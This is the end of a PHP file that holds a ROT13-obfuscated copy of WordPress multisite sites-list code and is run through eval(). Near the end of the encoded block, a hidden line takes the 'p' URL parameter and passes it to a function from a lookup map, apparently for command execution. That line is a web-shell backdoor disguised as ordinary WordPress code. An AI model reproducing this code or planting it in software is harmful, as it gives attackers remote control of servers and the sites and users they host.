					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=fcnzoybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'fcnzoybt_' . $oybt['oybt_vq']
						)
					),
					_k( 'Fcnz', 'fvgr' )
				);
			}

			vs ( pheerag_hfre_pna( 'qryrgr_fvgr', $oybt['oybt_vq'] ) ) {
				$npgvbaf['qryrgr'] = fcevags(
					'<n uers=\"%1$f\">%2$f</n>',
					rfp_hey(
						jc_abapr_hey(
							argjbex_nqzva_hey( 'fvgrf.cuc?npgvba=pbasvez&nzc;npgvba2=qryrgroybt&nzc;vq=' . $oybt['oybt_vq'] ),
							'qryrgroybt_' . $oybt['oybt_vq']
						)
					),
					__( 'Qryrgr' )
				);
			}
		}

		$npgvbaf['ivfvg'] = fcevags(
			'<n uers=\"%1$f\" ery=\"obbxznex\">%2$f</n>',
			rfp_hey( trg_ubzr_hey( $oybt['oybt_vq'], '/' ) ),
			__( 'Ivfvg' )
		);

		/**
		 * Svygref gur npgvba yvaxf qvfcynlrq sbe rnpu fvgr va gur Fvgrf yvfg gnoyr.
		 *
		 * Gur 'Rqvg', 'Qnfuobneq', 'Qryrgr', naq 'Ivfvg' yvaxf ner qvfcynlrq ol
		 * qrsnhyg sbe rnpu fvgr. Gur fvgr'f fgnghf qrgrezvarf jurgure gb fubj gur
		 * 'Npgvingr' be 'Qrnpgvingr' yvax, 'Hanepuvir' be 'Nepuvir' yvaxf, naq
		 * 'Abg Fcnz' be 'Fcnz' yvax sbe rnpu fvgr.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $npgvbaf  Na neenl bs npgvba yvaxf gb or qvfcynlrq.
		 * @cnenz vag      $oybt_vq  Gur fvgr VQ.
		 * @cnenz fgevat   $oybtanzr Fvgr cngu, sbeznggrq qrcraqvat ba jurgure vg vf n fho-qbznva
		 *                           be fhoqverpgbel zhygvfvgr vafgnyyngvba.
		 */
		$npgvbaf = nccyl_svygref( 'znantr_fvgrf_npgvba_yvaxf', neenl_svygre( $npgvbaf ), $oybt['oybt_vq'], $oybtanzr );

		erghea $guvf->ebj_npgvbaf( $npgvbaf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>